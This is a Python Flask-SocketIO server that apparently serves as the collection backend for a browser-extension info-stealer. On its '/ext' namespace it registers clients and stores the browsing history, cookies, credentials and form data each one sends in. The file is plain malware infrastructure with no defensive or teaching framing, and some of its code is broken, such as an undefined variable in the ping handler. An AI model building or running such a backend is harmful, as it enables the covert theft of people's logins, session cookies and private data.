from flask import Flask, render_template
from flask_socketio import SocketIO, emit, send 
import database
import json, os
from database import store_form_data, initDB

app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get("FLASK_SECRET", "secret!")
socketio = SocketIO(app)
connected_clients = [] #tuples of (clientid, sid)

import frontend

"""
Server responses to client: (int status, data) as tuple
http status code, data
"""

@app.route('/')
def hello_world():
    return 'Hello World!'

def messageReceived(methods=['Get', 'Post']):
    print('message was received!!!')

@socketio.on('my event')
def handle_my_custom_event(json, methods=['Get', 'Post']):
    print('received my event: ' + str(json))
    socketio.emit('my response', json, callback=messageReceived)

@socketio.on('connect', namespace='/ext')
def handle_ext_connect(sid, data_json):
    data = json.loads(data_json)
    bad = 400, "Invalid payload"
    if validate_payload(data) == 0:
        print("Invalid payload received from client.")
        return bad
    elif data["clientid"] == 0: #new client connection!
        clientid = database.create_new_client(data)
        connected_clients.append((clientid, sid))
        resp = database.construct_response(clientid)
        return 201, resp
    else:
        return handle_ext_ping(sid, data_json)


@socketio.on('ping', namespace='/ext')
def handle_ext_ping(sid, data_json):
    clientid = data["clientid"]
    bad = 400, "Invalid payload"
    connected_clients.append((clientid, sid))
    if database.store_history(data["history"], clientid):
        return bad
    for cookie in data["cookies"]:
        if database.store_cookie(cookie, clientid):
            return bad
    for cred in data["creds"]:
        if database.store_credential(cred, clientid):
            return bad
    for form in data["forms"]:
        if database.store_form_data(form, clientid):
            return bad
    return 200, database.construct_response(clientid)



@socketio.on('disconnect', namespace='/ext')
def handle_ext_disconnect(sid, data_json):
    clientid = [(clientid, sidx) for clientid, sidx in connected_clients if sidx == sid][0][0]
    connected_clients.remove((clientid,sid))
    database.store_payload(clientid)

def validate_payload(data):
    if (type(data.get("clientid", None)) != int or
        type(data.get("history", None)) != type([]) or
        type(data.get("cookies", None)) != type([]) or
        type(data.get("creds", None)) != type([]) or
        type(data.get("forms", None)) != type([])):
        return 0
    return 1

if __name__ == "__main__":
    initDB()
    with open("../sample_ext_to_srv.json") as f:
        clientid = 123
        data = json.load(f)
        store_form_data(data["forms"][0], clientid)
    socketio.run(app, debug=True)

